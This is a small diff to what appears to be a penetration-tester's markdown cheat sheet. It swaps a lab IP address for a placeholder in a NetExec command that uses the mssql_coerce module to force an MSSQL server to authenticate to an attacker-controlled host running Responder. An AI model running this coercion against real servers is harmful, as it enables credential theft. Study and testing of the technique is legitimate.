@@ -24,7 +24,7 @@ mssqlclient.py <domain>/'<user>'<impacket_target_auth> -windows-auth
 
 ## mssql coerce (expects responder)
 ```
-nxc mssql 10.129.242.173 -u '<user>' <auth> -M mssql_coerce -o L=<lhost>
+nxc mssql <ip> -u '<user>' <auth> -M mssql_coerce -o L=<lhost>
 ```
 
 ## mssql enum (expects responder)
